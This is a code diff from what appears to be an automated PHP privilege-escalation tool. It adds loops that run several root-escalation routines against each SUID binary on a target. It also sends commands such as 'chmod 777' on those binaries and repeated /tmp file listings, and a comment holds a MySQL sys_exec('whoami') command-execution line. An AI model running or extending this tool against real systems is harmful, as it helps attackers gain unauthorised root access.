@@ -86,8 +86,7 @@ Many times, we do want to see if there are any files owned by those users outsid
             $data = "chmod 777 $suid";
             $this->lan2stream4result($data,$this->stream_timeout);
             $this->pause();
-            
-            
+                       
             if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($suid,FALSE,"");$this->pause();
             
             if (!$this->ip2root8db($this->ip2id))  $this->suids8env($suid);$this->pause();
@@ -95,9 +94,6 @@ Many times, we do want to see if there are any files owned by those users outsid
             if (!$this->ip2root8db($this->ip2id))  $this->suids8app($suid);$this->pause();
             
             //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($suid);$this->pause();
-            
-
-            
             
         }
     }
@@ -118,13 +114,53 @@ Many times, we do want to see if there are any files owned by those users outsid
         $size = count($tab_suid);        
         for($i=0;$i<$size;$i++){
             $this->article("$i/$size Test on Suid", $tab_suid[$i]);
-            if (!$this->ip2root8db($this->ip2id)) $this->suids4one($tab_suid[$i]);
+            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($tab_suid[$i],FALSE,"");
             $this->pause();
         }
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
         $this->lan2stream4result($data,$this->stream_timeout);
         $this->pause();
+        
+        $size = count($tab_suid);
+        for($i=0;$i<$size;$i++){
+            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
+            if (!$this->ip2root8db($this->ip2id)) $this->suids8env($tab_suid[$i]);
+            $this->pause();
+        }
+        
+        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->pause();
+        
+        
+        
+        $size = count($tab_suid);
+        for($i=0;$i<$size;$i++){
+            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
+            if (!$this->ip2root8db($this->ip2id)) $this->suids8app($tab_suid[$i]);
+            $this->pause();
+        }
+        
+        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->pause();
+        
+        
+        $size = count($tab_suid);
+        for($i=0;$i<$size;$i++){
+            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
+            //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($tab_suid[$i]);
+            $this->pause();
+        }
+        
+        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->pause();
+        
+        
+        
+        
         /*
          mysql
          select sys_exec('whoami');
